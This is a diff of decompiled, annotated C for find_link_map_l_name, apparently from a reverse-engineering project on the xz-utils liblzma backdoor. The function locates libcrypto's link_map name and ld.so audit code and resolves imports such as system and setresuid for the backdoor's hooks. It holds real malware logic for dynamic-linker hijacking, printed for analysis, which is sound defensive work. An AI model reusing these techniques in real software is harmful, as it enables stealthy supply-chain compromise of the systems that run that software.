@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/104080_find_link_map_l_name.c
 // Function: find_link_map_l_name @ 0x104080
-// Calling convention: unknown
-// Prototype: undefined find_link_map_l_name(void)
+// Calling convention: __stdcall
+// Prototype: BOOL __stdcall find_link_map_l_name(backdoor_data_handle_t * data_handle, ptrdiff_t * libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)
 
 
 /*
@@ -15,128 +15,149 @@
 #include "xzre_types.h"
 
 
-undefined8 find_link_map_l_name(long *param_1,long *param_2,long param_3,long param_4)
+BOOL find_link_map_l_name
+               (backdoor_data_handle_t *data_handle,ptrdiff_t *libname_offset,
+               backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)
 
 {
-  int *piVar1;
-  undefined8 uVar2;
-  long *plVar3;
-  int iVar4;
+  libc_imports_t *plVar1;
+  elf_info_t *peVar2;
+  link_map *plVar3;
+  _func_64 *code_start;
+  BOOL BVar4;
   uint uVar5;
-  long lVar6;
-  long lVar7;
-  long lVar8;
-  long lVar9;
-  long lVar10;
-  long *plVar11;
-  long *plVar12;
-  long *plVar13;
-  long *plVar14;
-  long *plVar15;
+  lzma_allocator *allocator;
+  _func_19 *p_Var6;
+  _func_27 *p_Var7;
+  _func_20 *p_Var8;
+  lzma_allocator *allocator_00;
+  Elf64_Sym *pEVar9;
+  _func_39 *p_Var10;
+  uchar *code_start_00;
+  _func_21 *p_Var11;
+  _func_22 *p_Var12;
+  _func_28 *p_Var13;
+  link_map *plVar14;
+  link_map *plVar15;
+  u64 displacement;
+  link_map *plVar16;
+  link_map *plVar17;
+  link_map *plVar18;
+  libc_imports_t *libc_imports;
+  elf_info_t *ldso_elf;
+  link_map *link_map_cursor;
+  _func_64 *audit_stub;
+  lzma_allocator *import_allocator;
+  u64 local_38;
   
-  iVar4 = secret_data_append_from_address(0,0x6c,0x10,5);
-  if (iVar4 != 0) {
-    piVar1 = *(int **)(param_4 + 0x118);
-    plVar15 = *(long **)(*param_1 + 0x10);
-    lVar6 = get_lzma_allocator(1);
-    *(undefined8 *)(lVar6 + 0x10) = *(undefined8 *)(param_1[1] + 0x10);
-    lVar7 = lzma_alloc(0x8a8,lVar6);
-    *(long *)(piVar1 + 6) = lVar7;
-    if (lVar7 != 0) {
-      *piVar1 = *piVar1 + 1;
+  BVar4 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x6c,0x10,5);
+  if (BVar4 != FALSE) {
+    plVar1 = imported_funcs->libc;
+    plVar18 = data_handle->data->liblzma_map;
+    allocator = get_lzma_allocator();
+    allocator->opaque = data_handle->elf_handles->libc;
+    p_Var6 = (_func_19 *)lzma_alloc(0x8a8,allocator);
+    plVar1->exit = p_Var6;
+    if (p_Var6 != (_func_19 *)0x0) {
+      plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
     }
-    lVar7 = lzma_alloc(0x428,lVar6);
-    *(long *)(piVar1 + 0x16) = lVar7;
-    if (lVar7 != 0) {
-      *piVar1 = *piVar1 + 1;
+    p_Var7 = (_func_27 *)lzma_alloc(0x428,allocator);
+    plVar1->setlogmask = p_Var7;
+    if (p_Var7 != (_func_27 *)0x0) {
+      plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
     }
-    lVar7 = lzma_alloc(0x5f0,lVar6);
-    *(long *)(piVar1 + 8) = lVar7;
-    if (lVar7 != 0) {
-      *piVar1 = *piVar1 + 1;
+    p_Var8 = (_func_20 *)lzma_alloc(0x5f0,allocator);
+    plVar1->setresgid = p_Var8;
+    if (p_Var8 != (_func_20 *)0x0) {
+      plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
     }
-    lVar7 = get_lzma_allocator(1);
-    uVar2 = *(undefined8 *)(param_1[1] + 8);
-    *(undefined8 *)(lVar7 + 0x10) = *(undefined8 *)(param_1[1] + 0x20);
-    lVar8 = elf_symbol_get(uVar2,0xa60,0);
-    if (lVar8 != 0) {
-      lVar9 = lzma_alloc(0x4e0,lVar7);
-      *(long *)(param_4 + 0x68) = lVar9;
-      if (lVar9 != 0) {
-        *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
+    allocator_00 = get_lzma_allocator();
+    peVar2 = data_handle->elf_handles->dynamic_linker;
+    allocator_00->opaque = data_handle->elf_handles->libcrypto;
+    pEVar9 = elf_symbol_get(peVar2,STR_dl_audit_preinit,0);
+    if (pEVar9 != (Elf64_Sym *)0x0) {
+      p_Var10 = (_func_39 *)lzma_alloc(0x4e0,allocator_00);
+      imported_funcs->BN_num_bits = p_Var10;
+      if (p_Var10 != (_func_39 *)0x0) {
+        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
       }
-      lVar9 = *(long *)(lVar8 + 8) + **(long **)(param_1[1] + 8);
-      iVar4 = elf_contains_vaddr(*(long **)(param_1[1] + 8),lVar9,*(undefined8 *)(lVar8 + 0x10),4);
-      plVar13 = plVar15 + 300;
-      if (iVar4 != 0) {
+      peVar2 = data_handle->elf_handles->dynamic_linker;
+      code_start_00 = peVar2->elfbase->e_ident + pEVar9->st_value;
+      BVar4 = elf_contains_vaddr(peVar2,code_start_00,pEVar9->st_size,4);
+      plVar16 = plVar18 + 0x960;
+      if (BVar4 != FALSE) {
 LAB_001041f0:
-        if (plVar15 != plVar13) {
-          lVar10 = *(long *)(param_1[1] + 0x18);
-          if ((*plVar15 != *(long *)(lVar10 + 0x50)) || (plVar15[1] != *(long *)(lVar10 + 0x58)))
-          goto LAB_001041ec;
-          plVar11 = (long *)0x0;
-          plVar12 = (long *)0xffffffffffffffff;
-          for (plVar13 = *(long **)(*param_1 + 0x10); plVar13 < plVar15 + 3; plVar13 = plVar13 + 1)
-          {
-            plVar3 = (long *)*plVar13;
-            if (plVar15 + 3 <= plVar3) {
-              plVar14 = plVar12;
-              if (plVar15 + 0xd <= plVar12) {
-                plVar14 = plVar15 + 0xd;
+        if (plVar18 != plVar16) {
+          peVar2 = data_handle->elf_handles->liblzma;
+          if ((*(u64 *)plVar18 != peVar2->gnurelro_vaddr) ||
+             (*(u64 *)(plVar18 + 8) != peVar2->gnurelro_memsize)) goto LAB_001041ec;
+          plVar14 = (link_map *)0x0;
+          plVar15 = (link_map *)0xffffffffffffffff;
+          for (plVar16 = data_handle->data->liblzma_map; plVar16 < plVar18 + 0x18;
+              plVar16 = plVar16 + 8) {
+            plVar3 = *(link_map **)plVar16;
+            if (plVar18 + 0x18 <= plVar3) {
+              plVar17 = plVar15;
+              if (plVar18 + 0x68 <= plVar15) {
+                plVar17 = plVar18 + 0x68;
               }
-              if (plVar3 < plVar14) {
-                plVar11 = plVar13;
-                plVar12 = plVar3;
+              if (plVar3 < plVar17) {
+                plVar14 = plVar16;
+                plVar15 = plVar3;
               }
             }
           }
-          if (plVar12 != (long *)0xffffffffffffffff) {
-            *(undefined8 *)(lVar6 + 0x10) = *(undefined8 *)(param_1[1] + 0x10);
-            lVar10 = lzma_alloc(0xab8,lVar6);
-            *(long *)(piVar1 + 10) = lVar10;
-            if (lVar10 != 0) {
-              *piVar1 = *piVar1 + 1;
+          if (plVar15 != (link_map *)0xffffffffffffffff) {
+            allocator->opaque = data_handle->elf_handles->libc;
+            p_Var11 = (_func_21 *)lzma_alloc(0xab8,allocator);
+            plVar1->setresuid = p_Var11;
+            if (p_Var11 != (_func_21 *)0x0) {
+              plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
             }
-            plVar15 = *(long **)(*param_1 + 0x10);
-            lVar10 = (long)plVar12 - (long)plVar15;
-            uVar5 = (int)plVar15 - (int)plVar11;
-            if (plVar15 <= plVar11) {
-              uVar5 = (int)plVar11 - (int)plVar15;
+            plVar18 = data_handle->data->liblzma_map;
+            displacement = (long)plVar15 - (long)plVar18;
+            uVar5 = (int)plVar18 - (int)plVar14;
+            if (plVar18 <= plVar14) {
+              uVar5 = (int)plVar14 - (int)plVar18;
             }
-            *(ulong *)(param_3 + 0xf8) = (ulong)uVar5 + *(long *)(*param_1 + 0x18);
-            iVar4 = find_lea_instruction(lVar9,lVar9 + *(long *)(lVar8 + 0x10),lVar10);
-            if (iVar4 == 0) {
-              return 0;
+            (hooks->ldso_ctx).libcrypto_l_name = (char **)(data_handle->data->libcrypto_map + uVar5)
+            ;
+            BVar4 = find_lea_instruction(code_start_00,code_start_00 + pEVar9->st_size,displacement)
+            ;
+            if (BVar4 == FALSE) {
+              return FALSE;
             }
-            iVar4 = find_lea_instruction
-                              (*(long *)(param_3 + 0x100),
-                               *(long *)(param_3 + 0x108) + *(long *)(param_3 + 0x100),lVar10);
-            if (iVar4 == 0) {
-              return 0;
+            code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
+            BVar4 = find_lea_instruction
+                              ((u8 *)code_start,
+                               (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
+                               displacement);
+            if (BVar4 == FALSE) {
+              return FALSE;
             }
-            *(undefined8 *)(lVar6 + 0x10) = *(undefined8 *)(param_1[1] + 0x10);
-            lVar8 = lzma_alloc(0x9f8,lVar6);
-            *(long *)(piVar1 + 0xc) = lVar8;
-            if (lVar8 != 0) {
-              *piVar1 = *piVar1 + 1;
+            allocator->opaque = data_handle->elf_handles->libc;
+            p_Var12 = (_func_22 *)lzma_alloc(0x9f8,allocator);
+            plVar1->system = p_Var12;
+            if (p_Var12 != (_func_22 *)0x0) {
+              plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
             }
-            lVar6 = lzma_alloc(0x760,lVar6);
-            *(long *)(piVar1 + 0x18) = lVar6;
-            if (lVar6 != 0) {
-              *piVar1 = *piVar1 + 1;
+            p_Var13 = (_func_28 *)lzma_alloc(0x760,allocator);
+            plVar1->shutdown = p_Var13;
+            if (p_Var13 != (_func_28 *)0x0) {
+              plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
             }
-            *(undefined8 *)(lVar7 + 0x10) = *(undefined8 *)(param_1[1] + 0x20);
-            *param_2 = lVar10;
-            return 1;
+            allocator_00->opaque = data_handle->elf_handles->libcrypto;
+            *libname_offset = displacement;
+            return TRUE;
           }
         }
       }
-      lzma_free(*(undefined8 *)(param_4 + 0x68),lVar7);
+      lzma_free(imported_funcs->BN_num_bits,allocator_00);
     }
   }
-  return 0;
+  return FALSE;
 LAB_001041ec:
-  plVar15 = plVar15 + 1;
+  plVar18 = plVar18 + 8;
   goto LAB_001041f0;
 }
 
